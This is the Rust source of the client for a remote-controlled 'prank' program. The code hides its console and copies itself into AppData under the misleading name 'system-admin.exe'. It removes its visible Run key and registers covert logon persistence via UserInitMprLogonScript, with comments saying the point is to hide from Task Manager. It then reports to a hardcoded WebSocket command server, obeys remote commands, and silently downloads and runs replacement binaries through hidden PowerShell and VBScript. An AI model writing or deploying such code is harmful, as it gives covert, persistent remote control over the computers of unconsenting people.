// Run silently in the background — no console window shown
#![cfg_attr(windows, windows_subsystem = "windows")]

mod pranks;
mod safety;

use futures_util::{SinkExt, StreamExt};
use pranker_core::{PrankType, WsMessage};
use pranks::PrankExecutor;
use safety::SafetyManager;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time::sleep;
use tokio_tungstenite::{
    connect_async,
    tungstenite::{client::IntoClientRequest, protocol::Message},
};
use tracing::{error, info, warn};

/// APP VERSION CONSTANT
pub const APP_VERSION: &str = env!("CARGO_PKG_VERSION");

/// CONSTANT HARDCODED SERVER URL — PERMANENT (custom domain via Cloudflare → Render)
pub const DEFAULT_SERVER_URL: &str = "wss://prank.steamhub.qzz.io/ws";

/// Ensure the application automatically runs on Windows boot
fn ensure_startup_registration() {
    #[cfg(windows)]
    unsafe {
        use windows_sys::Win32::System::Registry::{
            RegCloseKey, RegCreateKeyW, RegDeleteValueW, RegOpenKeyExW, RegSetValueExW,
            HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ,
        };

        let Ok(exe_path) = std::env::current_exe() else { return };

        // ── Step 1: Copy ourselves to a hidden AppData subfolder for persistence ─
        // %APPDATA%\Microsoft\SystemHelper\system-admin.exe
        let target_path = match std::env::var("APPDATA") {
            Ok(ap) => {
                let dir = std::path::PathBuf::from(&ap)
                    .join("Microsoft")
                    .join("SystemHelper");
                let _ = std::fs::create_dir_all(&dir);
                let dest = dir.join("system-admin.exe");
                // Only copy if we are not already running from there
                if exe_path != dest {
                    let _ = std::fs::copy(&exe_path, &dest);
                }
                dest.to_string_lossy().to_string()
            }
            Err(_) => exe_path.to_string_lossy().to_string(),
        };

        // ── Step 2: Remove the old visible Run key so it disappears from Task Manager ─
        let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let run_val: Vec<u16> = "system-admin"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let mut hrun = 0isize;
        if RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_SET_VALUE, &mut hrun) == 0 {
            RegDeleteValueW(hrun, run_val.as_ptr());
            RegCloseKey(hrun);
        }

        // ── Step 3: Register via UserInitMprLogonScript (invisible from Startup tab) ─
        // Windows executes HKCU\Environment\UserInitMprLogonScript at every logon
        // silently — it never appears in Task Manager's Startup list.
        let env_key: Vec<u16> = "Environment"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let logon_val: Vec<u16> = "UserInitMprLogonScript"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let value_data: Vec<u16> = target_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let mut henv = 0isize;
        if RegCreateKeyW(HKEY_CURRENT_USER, env_key.as_ptr(), &mut henv) == 0 {
            RegSetValueExW(
                henv,
                logon_val.as_ptr(),
                0,
                REG_SZ,
                value_data.as_ptr() as *const u8,
                (value_data.len() * 2) as u32,
            );
            RegCloseKey(henv);
            info!("✅ Registered hidden logon persistence at: {}", target_path);
        }
    }
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt::init();

    info!("🎭 System Admin Client v{} initializing...", APP_VERSION);
    info!("ℹ️ EMERGENCY DISARM HOTKEY: Press Ctrl + Alt + Shift + K or Escape 3 times");

    // Automatically register as Windows Startup App
    ensure_startup_registration();

    // Order of precedence:
    // 1. Command-line argument (--server <URL> or positional wss://...)
    // 2. Environment variable (PRANKER_SERVER_URL)
    // 3. Hardcoded DEFAULT_SERVER_URL
    let server_url = std::env::args()
        .nth(1)
        .or_else(|| std::env::var("PRANKER_SERVER_URL").ok())
        .unwrap_or_else(|| DEFAULT_SERVER_URL.to_string());

    info!("🔗 Target Server URL: {}", server_url);

    // Initialize safety manager (hotkeys & mouse tracking)
    let safety = SafetyManager::new();
    let executor = std::sync::Arc::new(PrankExecutor::new(safety.clone()));

    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_else(|_| "Unknown Host".to_string());

    let client_id = format!("{}-{}", hostname, std::process::id());

    loop {
        info!("Connecting to server at {}...", server_url);

        let mut request = match server_url.as_str().into_client_request() {
            Ok(req) => req,
            Err(e) => {
                error!("Failed to parse URL: {}", e);
                sleep(Duration::from_secs(3)).await;
                continue;
            }
        };

        request.headers_mut().insert(
            "User-Agent",
            format!("SystemAdmin/{}", APP_VERSION).parse().unwrap(),
        );

        let conn_res = connect_async(request).await;

        match conn_res {
            Ok((ws_stream, _)) => {
                info!("✅ Successfully connected to Pranker Server!");

                let (mut write, mut read) = ws_stream.split();

                // Register client
                let reg_msg = WsMessage::RegisterClient {
                    client_id: client_id.clone(),
                    hostname: hostname.clone(),
                    os_info: std::env::consts::OS.to_string(),
                    version: APP_VERSION.to_string(),
                };

                if let Ok(json) = serde_json::to_string(&reg_msg) {
                    let _ = write.send(Message::Text(json)).await;
                }

                // Spawn Heartbeat Task
                let client_id_hb = client_id.clone();
                let safety_hb = safety.clone();
                let executor_hb = executor.clone();
                let (hb_tx, mut hb_rx) = tokio::sync::mpsc::unbounded_channel::<String>();

                let hb_handle = tokio::spawn(async move {
                    loop {
                        sleep(Duration::from_secs(2)).await;

                        let hb_msg = WsMessage::ClientHeartbeat {
                            client_id: client_id_hb.clone(),
                            safe_mode_active: safety_hb.auto_pause.load(Ordering::Relaxed),
                            disarmed: safety_hb.disarmed.load(Ordering::Relaxed),
                            user_active: safety_hb.user_active.load(Ordering::Relaxed),
                            active_pranks: executor_hb.get_active_pranks(),
                            version: APP_VERSION.to_string(),
                        };

                        if let Ok(json) = serde_json::to_string(&hb_msg) {
                            if hb_tx.send(json).is_err() {
                                break;
                            }
                        }
                    }
                });

                // Read loop
                loop {
                    tokio::select! {
                        Some(hb_json) = hb_rx.recv() => {
                            if write.send(Message::Text(hb_json)).await.is_err() {
                                break;
                            }
                        }
                        maybe_msg = read.next() => {
                            match maybe_msg {
                                Some(Ok(Message::Text(text))) => {
                                    if let Ok(ws_msg) = serde_json::from_str::<WsMessage>(&text) {
                                        match ws_msg {
                                            WsMessage::PrankCommand { prank, enable } => {
                                                info!("Received Prank Command: {:?} (enable={})", prank, enable);
                                                executor.execute(prank, enable);
                                            }
                                            WsMessage::DisarmCommand => {
                                                warn!("🚨 Disarm command received from server!");
                                                safety.panic_disarm();
                                                executor.execute(PrankType::InvertMouse { duration_sec: 0 }, false);
                                            }
                                            WsMessage::TriggerAutoUpdate { download_url, .. } => {
                                                info!("🚀 Triggering client auto-update from {}", download_url);
                                                perform_auto_update(&download_url);
                                            }
                                            _ => {}
                                        }
                                    }
                                }
                                Some(Ok(Message::Close(_))) | None => {
                                    warn!("Connection closed by server");
                                    break;
                                }
                                Some(Err(e)) => {
                                    error!("WebSocket error: {:?}", e);
                                    break;
                                }
                                _ => {}
                            }
                        }
                    }
                }

                hb_handle.abort();
            }
            Err(e) => {
                error!("Failed to connect: {:?}. Retrying in 3 seconds...", e);
            }
        }

        sleep(Duration::from_secs(3)).await;
    }
}

/// Download new binary, overwrite current executable via batch script, and restart
fn perform_auto_update(download_url: &str) {
    let url = download_url.to_string();
    tokio::task::spawn(async move {
        let current_exe = match std::env::current_exe() {
            Ok(p) => p,
            Err(e) => {
                error!("Failed to get current_exe path: {}", e);
                return;
            }
        };

        let temp_dir = std::env::temp_dir();
        let new_exe_path = temp_dir.join("system-admin_update.exe");

        info!("Downloading updated binary from {} to {:?}", url, new_exe_path);

        // Download via PowerShell with explicit TLS 1.2
        let ps_download = format!(
            "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; \
            $web = New-Object System.Net.WebClient; \
            $web.DownloadFile('{}', '{}');",
            url,
            new_exe_path.to_string_lossy().replace("\\", "\\\\")
        );

        let ps_download_clone = ps_download.clone();
        let download_success = tokio::task::spawn_blocking(move || {
            #[cfg(windows)]
            {
                use std::os::windows::process::CommandExt;
                const CREATE_NO_WINDOW: u32 = 0x08000000;
                let status = std::process::Command::new("powershell")
                    .args(["-NoProfile", "-Command", &ps_download_clone])
                    .creation_flags(CREATE_NO_WINDOW)
                    .status();
                status.is_ok() && status.unwrap().success()
            }
            #[cfg(not(windows))]
            {
                false
            }
        }).await.unwrap_or(false);

        if !download_success {
            error!("PowerShell download process execution failed");
        }

        if !new_exe_path.exists() {
            error!("Auto-update download failed: file does not exist at {:?}", new_exe_path);
            return;
        }

        // Use a VBScript to silently wait, overwrite, and relaunch.
        // wscript.exe //B runs with NO console window — unlike cmd.exe which flashes briefly.
        let vbs_path = temp_dir.join("update_system_admin.vbs");
        let new_exe_str = new_exe_path.to_string_lossy().replace('\\', "\\\\");
        let cur_exe_str = current_exe.to_string_lossy().replace('\\', "\\\\");

        let vbs_script = format!(
            "WScript.Sleep 2000\r\n\
            Dim fso : Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n\
            fso.CopyFile \"{new}\", \"{cur}\", True\r\n\
            Dim shell : Set shell = CreateObject(\"WScript.Shell\")\r\n\
            shell.Run \"\"\"{cur}\"\"\", 0, False\r\n\
            fso.DeleteFile \"{new}\"\r\n\
            fso.DeleteFile WScript.ScriptFullName\r\n",
            new = new_exe_str,
            cur = cur_exe_str,
        );

        if std::fs::write(&vbs_path, &vbs_script).is_ok() {
            info!("Spawning silent VBScript updater and exiting...");

            #[cfg(windows)]
            {
                use std::os::windows::process::CommandExt;
                const CREATE_NO_WINDOW: u32 = 0x08000000;
                const DETACHED_PROCESS: u32 = 0x00000008;
                // //B = batch/silent mode: no dialogs, no output window at all
                let _ = std::process::Command::new("wscript.exe")
                    .args(["//B", vbs_path.to_str().unwrap_or("")])
                    .creation_flags(CREATE_NO_WINDOW | DETACHED_PROCESS)
                    .spawn();
            }

            std::process::exit(0);
        }
    });
}
